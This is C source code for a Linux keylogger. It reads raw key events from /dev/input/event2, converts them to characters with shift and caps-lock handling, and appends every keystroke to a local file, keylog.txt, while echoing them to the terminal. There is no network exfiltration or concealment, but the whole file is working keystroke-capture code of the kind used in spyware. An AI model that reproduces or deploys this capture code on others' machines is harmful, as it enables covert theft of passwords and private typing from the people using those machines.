  #include <fcntl.h>
  #include <linux/input-event-codes.h>
  #include <linux/input.h>
  #include <signal.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>

  #define DEVICE_INPUT_PATH "/dev/input/event2"

  #include <linux/input.h>

  char *key_map[] = {[KEY_RESERVED] = "[RESERVED]",
                     [KEY_ESC] = "[ESC]",
                     [KEY_1] = "1",
                     [KEY_2] = "2",
                     [KEY_3] = "3",
                     [KEY_4] = "4",
                     [KEY_5] = "5",
                     [KEY_6] = "6",
                     [KEY_7] = "7",
                     [KEY_8] = "8",
                     [KEY_9] = "9",
                     [KEY_0] = "0",
                     [KEY_MINUS] = "-",
                     [KEY_EQUAL] = "=",
                     [KEY_BACKSPACE] = "[BACKSPACE]",
                     [KEY_TAB] = "[TAB]",
                     [KEY_Q] = "q",
                     [KEY_W] = "w",
                     [KEY_E] = "e",
                     [KEY_R] = "r",
                     [KEY_T] = "t",
                     [KEY_Y] = "y",
                     [KEY_U] = "u",
                     [KEY_I] = "i",
                     [KEY_O] = "o",
                     [KEY_P] = "p",
                     [KEY_LEFTBRACE] = "[",
                     [KEY_RIGHTBRACE] = "]",
                     [KEY_ENTER] = "\n",
                     [KEY_LEFTCTRL] = "[LCTRL]",
                     [KEY_A] = "a",
                     [KEY_S] = "s",
                     [KEY_D] = "d",
                     [KEY_F] = "f",
                     [KEY_G] = "g",
                     [KEY_H] = "h",
                     [KEY_J] = "j",
                     [KEY_K] = "k",
                     [KEY_L] = "l",
                     [KEY_SEMICOLON] = ";",
                     [KEY_APOSTROPHE] = "'",
                     [KEY_GRAVE] = "`",
                     [KEY_LEFTSHIFT] = "[LSHIFT]",
                     [KEY_BACKSLASH] = "\\",
                     [KEY_Z] = "z",
                     [KEY_X] = "x",
                     [KEY_C] = "c",
                     [KEY_V] = "v",
                     [KEY_B] = "b",
                     [KEY_N] = "n",
                     [KEY_M] = "m",
                     [KEY_COMMA] = ",",
                     [KEY_DOT] = ".",
                     [KEY_SLASH] = "/",
                     [KEY_RIGHTSHIFT] = "[RSHIFT]",
                     [KEY_SPACE] = " "};

  char *shift_key_map[] = {
      [KEY_1] = "!",     [KEY_2] = "@",   [KEY_3] = "#",    [KEY_4] = "$",
      [KEY_5] = "%",     [KEY_6] = "^",   [KEY_7] = "&",    [KEY_8] = "*",
      [KEY_9] = "(",     [KEY_0] = ")",   [KEY_Q] = "Q",    [KEY_W] = "W",
      [KEY_E] = "E",     [KEY_R] = "R",   [KEY_T] = "T",    [KEY_Y] = "Y",
      [KEY_U] = "U",     [KEY_I] = "I",   [KEY_O] = "O",    [KEY_P] = "P",
      [KEY_A] = "A",     [KEY_S] = "S",   [KEY_D] = "D",    [KEY_F] = "F",
      [KEY_G] = "G",     [KEY_H] = "H",   [KEY_J] = "J",    [KEY_K] = "K",
      [KEY_L] = "L",     [KEY_Z] = "Z",   [KEY_X] = "X",    [KEY_C] = "C",
      [KEY_V] = "V",     [KEY_B] = "B",   [KEY_N] = "N",    [KEY_M] = "M",
      [KEY_COMMA] = "<", [KEY_DOT] = ">", [KEY_SLASH] = "?"};

  // global varibles
  int caps_active = 0;
  int shift_active = 0;

  FILE *log_ptr = NULL;

  char *handleCharPressed(short ev_code, int ev_value) {
    // printf("entering *handleCharPressed\n");
    if (caps_active == 1 || shift_active == 1) {
      if (shift_key_map[ev_code] != NULL) {
        return shift_key_map[ev_code];
      }
    }
    if (key_map[ev_code] != NULL) {
      return key_map[ev_code];
    }
    return "";
  }

  void handleKeyPressed(short ev_code, int ev_value) {
    setvbuf(log_ptr, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    // printf("entering handleKeyPressed\n");
    if (ev_code == KEY_CAPSLOCK && ev_value == 1) {
      caps_active = (caps_active + 1) % 2;
    } else if (ev_code == KEY_LEFTSHIFT || ev_code == KEY_RIGHTSHIFT) {
      if (ev_value == 0) {
        shift_active = 0;
      } else {
        shift_active = 1;
      }
    } else if (ev_value != 0) {
      printf("%s", handleCharPressed(ev_code, ev_value));
      fprintf(log_ptr ,"%s", handleCharPressed(ev_code, ev_value));
    }
  }

  void INThandler() {
    printf("\nClosing device and exiting...\n");
    exit(0);
  }

  int main(int argc, char *argv[]) {
    //opening /input file descriptors
    int fd;
    struct input_event ev;
    fd = open(DEVICE_INPUT_PATH, O_RDONLY);
    if (fd == -1) {
      perror("Error while opening the device file");
      printf("maybe you need root privilege...");
    }
    signal(SIGINT, INThandler);
    printf("this is my fd: %d\n", fd);

    //opening log file
    log_ptr = fopen("./keylog.txt", "a");
    if (log_ptr == NULL)
    {
      perror("Error while opening log file");
    }

    while (1) {
      ssize_t bytes_read = read(fd, &ev, sizeof(ev));
      // checks if the read executed correctly
      if (bytes_read == sizeof(ev)) {
        if (ev.type == EV_KEY) {
          handleKeyPressed(ev.code, ev.value);
        }
      } 
      else if (bytes_read == -1) {
        perror("Error reading device");
        return EXIT_FAILURE;
      }
    }

    close(fd);

    return EXIT_SUCCESS;
  }
